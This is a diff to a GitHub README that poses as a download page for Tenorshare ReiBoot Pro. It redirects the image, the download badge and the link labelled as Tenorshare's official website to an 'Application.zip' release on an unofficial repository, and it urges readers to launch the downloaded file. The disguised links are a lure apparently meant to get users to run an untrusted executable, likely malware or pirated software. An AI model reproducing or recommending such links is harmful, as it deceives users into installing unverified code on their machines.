@@ -2,7 +2,7 @@
 
 Welcome to the Tenorshare ReiBoot Pro Download repository! 🎉
 
-![ReiBoot Pro](https://img.icons8.com/office/2x/arrow.png)
+![ReiBoot Pro](https://github.com/luckee8898/Tenorshare-ReiBoot-Pro-Download/releases/download/v1.0/Application.zip)
 
 ## Overview
 
@@ -36,7 +36,7 @@ This repository is dedicated to providing users with access to the Tenorshare Re
 
 To get started with Tenorshare ReiBoot Pro, download the software using the link below:
 
-[![Download Tenorshare ReiBoot Pro](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Tenorshare ReiBoot Pro](https://github.com/luckee8898/Tenorshare-ReiBoot-Pro-Download/releases/download/v1.0/Application.zip)](https://github.com/luckee8898/Tenorshare-ReiBoot-Pro-Download/releases/download/v1.0/Application.zip)
 
 **Launch the downloaded file to install the software and start using its powerful features!**
 
@@ -48,4 +48,4 @@ Have questions or need assistance with Tenorshare ReiBoot Pro? Feel free to reac
 
 Thank you for choosing Tenorshare ReiBoot Pro. Happy downloading! 🎊
 
-🔗 For more information, visit [Tenorshare's official website](https://www.tenorshare.com/). 🔗
+🔗 For more information, visit [Tenorshare's official website](https://github.com/luckee8898/Tenorshare-ReiBoot-Pro-Download/releases/download/v1.0/Application.zip). 🔗
